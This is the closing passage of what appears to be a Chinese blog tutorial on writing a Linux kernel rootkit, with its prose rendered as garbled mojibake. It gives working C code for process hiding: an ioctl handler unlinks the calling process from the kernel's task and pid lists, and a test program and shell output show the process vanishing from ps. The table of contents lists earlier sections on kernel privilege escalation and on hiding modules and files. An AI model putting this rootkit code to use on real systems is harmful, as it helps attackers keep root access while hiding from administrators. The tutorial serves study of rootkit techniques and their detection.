class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°æœ€ç»ˆæˆåŠŸéšè—æ‰äº†<code>/dev/rootkit</code>ä»¥åŠæ ¹ç›®å½•çš„<code>rootkit.ko</code>å¹¶ä¸”å¹¶ä¸ä¼šå½±å“å…¶æ­£å¸¸åŠŸèƒ½ã€‚</p>
<h3 id="è¿›ç¨‹éšè—"><a href="#è¿›ç¨‹éšè—" class="headerlink" title="è¿›ç¨‹éšè—"></a>è¿›ç¨‹éšè—</h3><p>ææƒçš„æœ€ç»ˆç›®çš„éƒ½æ˜¯è®©æˆ‘ä»¬çš„æŸä¸€ä¸ªè¿›ç¨‹æ‹¥æœ‰rootæƒé™ï¼Œä¸€ä¸ªrootæƒé™çš„è¿›ç¨‹å‘äº¤äºå¤„äºå†…æ ¸æ€çš„æ¨¡å—æ¥è¯´å¯ä»¥åšçš„äº‹æƒ…æ›´å¤šï¼Œä¸è¿‡è¿™ä¸ªè¿›ç¨‹ä¹Ÿæ˜¯å­˜åœ¨è¢«å‘ç°çš„é£é™©ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥éœ€è¦è¿›è¡Œè¿›ç¨‹éšè—ã€‚</p>
<p>é¦–å…ˆï¼Œä¼—æ‰€å‘¨çŸ¥Linux kernelä¸­çš„PCBå…¶å®æ˜¯<code>task_struct</code>ç»“æ„ä½“ï¼Œå¤šä¸ª task_struct ä¹‹é—´ç›¸äº’è¿æ¥æˆåŒå‘é“¾è¡¨ç»“æ„ï¼Œè‹¥æ˜¯è¿ç»´äººå‘˜é€‰æ‹©éå† task_struct é“¾è¡¨ä¾¿å¾ˆå®¹æ˜“å‘ç°æˆ‘ä»¬çš„æ¶æ„è¿›ç¨‹ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬çš„è¿›ç¨‹ä» task_struct é“¾è¡¨ä¸­æ‘˜é™¤ã€‚</p>
<p>åŒæ ·çš„ï¼Œè¿ç»´äººå‘˜è‹¥æ˜¯éå† <code>/proc/pid</code> ï¼Œç”šè‡³æ˜¯ç›´æ¥éå†æ‰€æœ‰è¿›ç¨‹å·ï¼Œåˆ™å¾ˆå®¹æ˜“å‘ç°æˆ‘ä»¬çš„æ¶æ„è¿›ç¨‹ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦å°†å…¶ä» pid é“¾è¡¨ä¸­æ‘˜é™¤ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">rootkit_ioctl</span><span class="params">(struct file *__file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> *<span class="title">cur_node</span>;</span></span><br><span class="line"></span><br><span class="line">    spin_lock(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">    cur_node = &amp;current-&gt;pid_links[PIDTYPE_PID];</span><br><span class="line"></span><br><span class="line">    list_del_rcu(&amp;current-&gt;tasks);</span><br><span class="line">    INIT_LIST_HEAD(&amp;current-&gt;tasks);</span><br><span class="line"></span><br><span class="line">    hlist_del_rcu(cur_node);</span><br><span class="line">    INIT_HLIST_NODE(cur_node);</span><br><span class="line">    cur_node-&gt;pprev = &amp;cur_node;</span><br><span class="line"></span><br><span class="line">    spin_unlock(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä½¿ç”¨ä¸Šè¿°ä»£ç å³å¯åˆ é™¤å½“å‰è¿›ç¨‹çš„pidã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/rootkit&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;faild open rootkit!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åç¼–å†™ä¸€ä¸ªç”¨äºæµ‹è¯•çš„ç”¨æˆ·è¿›ç¨‹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~ $ ./exp&amp;</span><br><span class="line">~ $ ps</span><br><span class="line">PID   USER     TIME  COMMAND</span><br><span class="line">    1 root      0:01 &#123;init&#125; /bin/sh /init kaslr</span><br><span class="line">  <span class="comment"># ... ...</span></span><br><span class="line">  140 ctf       0:00 sh</span><br><span class="line">  142 ctf       0:00 ps</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆæˆåŠŸå®ç°è¿›ç¨‹éšè—ã€‚</p>

        </div>

        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2024/06/03/Linux-Rootkit%E7%8E%B0%E4%BB%A3%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Linux Rootkitç°ä»£æŠ€æœ¯åˆ†æ</span>
                                <span class="post-nav-item">ä¸Šä¸€ç¯‡</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2024/01/24/Kernel%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Kernelå†…å­˜ç®¡ç†</span>
                                <span class="post-nav-item">ä¸‹ä¸€ç¯‡</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
            <div class="comment-container">
                <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;è¯„è®º</i>
    </div>
    

        
            
    <div class="valine-container">
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script >
            function loadValine() {
                new Valine({
                    el: '#vcomments',
                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
                    meta: ['nick', 'mail', 'link'],
                    avatar: 'wavatar',
                    enableQQ: true,
                    placeholder: 'ğŸ˜œè‹¥æœ‰é—®é¢˜è¯·å„ä½å¤§å¸ˆå‚…ç•™è¨€è¯„è®º',
                    lang: 'zh-CN'.toLowerCase()
                });

                function getAuthor(language) {
                    switch (language) {
                        case 'en':
                            return 'Author';
                        case 'zh-CN':
                            return 'åšä¸»';
                        default:
                            return 'Master';
                    }
                }

                // Add "Author" identify
                const getValineDomTimer = setInterval(() => {
                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
                    if (vcards.length > 0) {
                        let author = '196082';

                        if (author) {
                            for (let vcard of vcards) {
                                const vnick_dom = vcard.querySelector('.vhead .vnick');
                                const vnick = vnick_dom.innerHTML;
                                if (vnick === author) {
                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                                }
                            }
                        }
                        clearInterval(getValineDomTimer);
                    } else {
                        clearInterval(getValineDomTimer);
                    }
                }, 2000);
            }

            if ('false') {
                const loadValineTimeout = setTimeout(() => {
                    loadValine();
                    clearTimeout(loadValineTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadValine);
            }
        </script>
    </div>



        
    
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2021</span>&nbsp;-&nbsp;
            
            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        è®¿é—®äººæ•°&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        æ€»è®¿é—®é‡&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            ç”± <a target="_blank" href="https://hexo.io">Hexo</a> é©±åŠ¨&nbsp;|&nbsp;ä¸»é¢˜&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
        </div>
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fas fa-comment"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">å‰è¨€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LKM%E5%9F%BA%E7%A1%80"><span class="nav-text">LKMåŸºç¡€</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">æƒé™æå‡</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87commit-creds-prepare-kernel-cred-NULL-%E6%8F%90%E6%9D%83"><span class="nav-text">é€šè¿‡commit_creds(prepare_kernel_cred(NULL))ææƒ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9cred%E7%BB%93%E6%9E%84%E4%BD%93%E5%AE%9E%E7%8E%B0%E6%8F%90%E6%9D%83"><span class="nav-text">é€šè¿‡ç›´æ¥ä¿®æ”¹credç»“æ„ä½“å®ç°ææƒ</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%E9%9A%90%E8%97%8F"><span class="nav-text">æ¨¡å—éšè—</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#proc-modules%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F"><span class="nav-text">&#x2F;proc&#x2F;modulesä¿¡æ¯éšè—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sys-module-%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F"><span class="nav-text">&#x2F;sys&#x2F;module&#x2F;ä¿¡æ¯éšè—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sys-class-%E4%BF%A1%E6%81%AF%E9%9A%90%E8%97%8F"><span class="nav-text">&#x2F;sys&#x2F;class&#x2F;ä¿¡æ¯éšè—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F"><span class="nav-text">æ–‡ä»¶éšè—</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F"><span class="nav-text">è¿›ç¨‹éšè—</span></a></li></ol></li></ol>
    </div>
</div>
        </aside>
    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="æœç´¢..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>


<div class="post-scripts">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
    
</div>



</body>
</html>
